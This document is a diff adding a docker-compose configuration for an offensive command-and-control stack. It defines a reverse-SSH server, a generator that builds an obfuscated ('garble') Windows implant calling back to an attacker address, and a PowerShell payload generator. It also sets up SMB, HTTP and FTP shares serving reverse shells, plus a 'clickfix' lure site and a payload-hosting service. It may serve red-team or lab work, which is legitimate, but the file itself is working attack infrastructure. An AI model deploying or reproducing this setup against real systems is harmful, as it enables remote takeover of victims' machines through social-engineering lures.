@@ -1,0 +1,135 @@
+services:
+
+  ######  SERVER  ######
+
+  reverse-ssh:
+    build:
+      context: reverse_ssh
+    container_name: reverse-ssh
+    env_file:
+      - .env
+    environment:
+      - EXTERNAL_ADDRESS=0.0.0.0:${SERVER_PORT}
+    ports:
+      - ${SERVER_PORT}:2222
+    volumes:
+      - reverse_ssh_data:/data
+      - ${SERVER_WORKSPACE}/ssh_keys:/ssh_keys
+
+  generator-reverse-ssh:
+    build:
+      context: reverse_ssh/generator
+    container_name: generator-reverse-ssh
+    env_file:
+      - .env
+    command: link --garble --goos windows -s ${ATTACKER_ADDRESS}:${SERVER_PORT} --name ${EXE_FILENAME}
+    depends_on:
+      - reverse-ssh
+    volumes:
+      - ${SERVER_WORKSPACE}/ssh_keys:/ssh_keys
+      - shells_and_executions:/shells_and_executions
+      - reverse_ssh_data:/data
+
+  powershell-generator:
+    build:
+      context: powershell_generator
+    container_name: powershell-generator
+    env_file:
+      - .env
+    volumes:
+      - ${POWERSHELL_GENERATOR}/templates:/templates
+      - ${POWERSHELL_GENERATOR}/public:/public
+      - powerhsell_scripts:/powerhsell_scripts
+
+  ######  SHARE  ######
+
+  smb-reverse-shells-and-executions-share:
+    image: dperson/samba
+    container_name: smb-reverse-shells-and-executions-share
+    command: "-p -u '${SMB_USER};${SMB_PASSWORD}' -s '${SMB_SHARE};/mount;yes;no;no;all'"
+    env_file:
+      - .env
+    ports:
+      - ${SMB_REVERSE_SHELL_AND_EXECUTION_PORT}:445
+    volumes:
+      - shells_and_executions:/mount
+
+  http-reverse-shells-and-executions-share:
+    image: httpd:2.4
+    container_name: http-reverse-shells-and-executions-share
+    env_file:
+      - .env
+    ports:
+      - ${HTTP_REVERSE_SHELL_AND_EXECUTIONS_SHARE_PORT}:80
+    volumes:
+      - shells_and_executions:/usr/local/apache2/htdocs/
+
+  ftp-reverse-shells-and-executions-share:
+    image: delfer/alpine-ftp-server
+    container_name: ftp-reverse-shells-and-executions-share
+    env_file:
+      - .env
+    environment:
+      - USERS=${FTP_USER}|${FTP_PASS}|shells_and_executions
+      - ADDRESS=0.0.0.0
+    ports:
+      - "${FTP_PORT}:21"
+      - 21000-21010:21000-21010
+    volumes:
+      - shells_and_executions:/shells_and_executions
+
+  http-powershell-share:
+    image: httpd:2.4
+    container_name: http-powershell-share
+    env_file:
+      - .env
+    ports:
+      - ${HTTP_POWERSHELL_SHARE_PORT}:80
+    volumes:
+      - powerhsell_scripts:/usr/local/apache2/htdocs/
+      - ${HTTP_POWERSHELL_SHARE}/httpd.conf:/usr/local/apache2/conf/httpd.conf
+
+  
+  
+  ######  CLIENT  ######
+
+  clickfix:
+    build:
+      context: ${CLICKFIX_WORKSPACE}
+    container_name: clickfix
+    env_file:
+      - .env
+    ports: 
+      - ${CLICKFIX_HTTP_PORT}:3000
+    volumes:
+      - ${CLICKFIX_WORKSPACE}/public:/app/public
+
+  files:
+    build:
+      context: ${FILES_WORKSPACE}
+    container_name: files
+    env_file:
+      - .env
+    ports: 
+      - ${FILES_HTTP_PORT}:80
+    volumes:
+      - ${FILES_WORKSPACE}/${FILES_TECHNIQUE_IN_USE}:/usr/local/apache2/htdocs/
+
+  
+  
+  
+  ######  TEST BOX  ######
+
+  # bashbox:
+  #   image: debian:bullseye
+  #   container_name: bashbox
+  #   stdin_open: true
+  #   tty: true
+  #   command: apt update && apt install -y iputils-ping openssh-client; bash
+  #   volumes:
+  #     - ${SERVER_WORKSPACE}/ssh_keys:/ssh_keys
+
+volumes:
+  reverse_ssh_data:
+  shells_and_executions:
+  powerhsell_scripts:
